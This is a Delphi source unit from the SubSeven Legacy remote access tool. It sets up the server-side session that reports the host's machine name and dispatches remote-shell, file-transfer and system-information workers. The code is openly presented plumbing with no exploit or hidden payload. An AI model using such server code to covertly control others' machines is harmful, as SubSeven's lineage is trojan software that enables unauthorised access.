{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit Sub7.Thread.Net.Server.Peer.Session;

interface

uses System.Classes, Sub7.TLS.IOHandler, Sub7.Thread.Net.Server.Peer.NonBlockingCmd,
     Generics.Collections, Winapi.Winsock2, Sub7.Core.Protocol, XSuperObject,
     Sub7.Thread.Net.Server.Peer.Base, System.SyncObjs, Sub7.Core.Thread,
     Sub7.Core.Types, Sub7.Core.Thread.Watcher;

type
  TSub7ServerPeerSession = class(TSub7PeerNonBlockingCmd)
  private
  protected
    {@M}
    procedure OnBeforeCommandLoop(); override;
    procedure OnAfterCommandLoop(); override;
    procedure OnIdle(); override;
    procedure TerminatedSet(); override;
    procedure OnCommand(const ACommand : TS7Command; const AData : ISuperObject = nil); override;
  public
    {@C}
    constructor Create(const AClient : TSub7TLSIOHandler); overload;

    {@M}
    procedure AddWorker(const AWorkerKind : TWorkerKind; const AIOHandler : TSub7TLSIOHandler);
  end;

implementation

uses Winapi.Windows, System.SysUtils, Sub7.Core.Utils, Sub7.Core.Diagnostic,

     Sub7.Thread.Net.Server.SystemInformationHook,
     Sub7.Thread.Net.Server.RemoteShell,
     Sub7.Thread.Net.Server.Peer.Transfer.Send,
     Sub7.Thread.Net.Server.Peer.Transfer.Receive;

{-------------------------------------------------------------------------------
  Add worker to worker list
-------------------------------------------------------------------------------}
procedure TSub7ServerPeerSession.AddWorker(const AWorkerKind : TWorkerKind; const AIOHandler : TSub7TLSIOHandler);
var AWorker : TCoreThread;
begin
  AWorker := nil;
  ///

  if not Assigned(AIOHandler) then
    Exit();
  ///

  case AWorkerKind of
    wkSessionListener : AWorker := TSub7SystemInformationHook.Create(AIOHandler);
    wkTerminal        : AWorker := TSub7ServerPeerRemoteShell.Create(AIOHandler);
    wkDownloadHandler : AWorker := TThreadTransferSend.Create(AIOHandler);
    wkUploadHandler   : AWorker := TThreadTransferReceive.Create(AIOHandler);
  end;

  if not Assigned(AWorker) then
    FreeAndNil(AIOHandler)
  else
    GLOBAL_THREAD_WATCHER.Add(AWorker, self);
end;

{-------------------------------------------------------------------------------
  On Idle
-------------------------------------------------------------------------------}
procedure TSub7ServerPeerSession.OnIdle();
begin
  inherited OnIdle();
  ///

end;

{-------------------------------------------------------------------------------
  ___constructor
-------------------------------------------------------------------------------}
constructor TSub7ServerPeerSession.Create(const AClient : TSub7TLSIOHandler);
begin
  inherited Create(AClient);
  ///

end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ServerPeerSession.OnBeforeCommandLoop();
var AData : ISuperObject;
begin
  {
    Let client know about our new session id.
  }
  AData := TSuperObject.Create();

  AData.S['session_id']   := self.UniqueID;
  AData.S['machine_name'] := GetComputerName();

  FIOHandler.SendCommand(s7cCreateSession, AData);
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ServerPeerSession.OnAfterCommandLoop();
begin
  ///
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ServerPeerSession.OnCommand(const ACommand : TS7Command; const AData : ISuperObject = nil);
begin
  ///

end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ServerPeerSession.TerminatedSet();
begin


  ///
  inherited TerminatedSet();
end;

end.

